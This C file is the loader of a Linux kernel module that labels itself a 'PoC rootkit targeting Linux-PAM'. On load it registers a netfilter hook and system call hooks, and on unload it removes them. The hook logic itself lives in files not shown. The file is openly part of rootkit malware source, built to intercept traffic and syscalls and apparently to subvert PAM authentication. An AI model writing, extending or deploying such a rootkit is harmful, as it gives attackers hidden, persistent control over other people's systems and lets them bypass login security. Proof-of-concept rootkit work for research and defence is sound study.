#include <linux/init.h>
#include <linux/module.h>

#include "hooking/hooking.h"
#include "net/net.h"
#include "sys.h"
#include "util/sys_checks.h"
#include "util/log.h"
#include "util/constants.h"

MODULE_AUTHOR("arm1nt");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("PoC rootkit targeting Linux-PAM");

extern hook_data_t old_pamkit_syscall_hooks[];

static int __init
pamkit_init(void)
{
    prdebug("Start initializing module...");

    int ret = 0;

    ret = add_netfilter_hook();
    if (ret) {
        prerr("Failed to register netfilter hook");
        return PAMKIT_GENERIC_ERROR;
    }

    ret = register_system_call_hooks(old_pamkit_syscall_hooks);
    if (ret) {
        prerr("Failed to register system call hooks");
        return PAMKIT_GENERIC_ERROR;
    }

    prdebug("Module successfully initialized!");
    return ret;
}
module_init(pamkit_init);

static void __exit
pamkit_exit(void)
{
    prdebug("Starting cleanup to remove module...");

    remove_netfilter_hook();

    if (deregister_system_call_hooks(old_pamkit_syscall_hooks)) {
        prwarn("Unable to de-register the syscall hooks");
    }

    prdebug("Cleanup for removing module finished!");
}
module_exit(pamkit_exit);
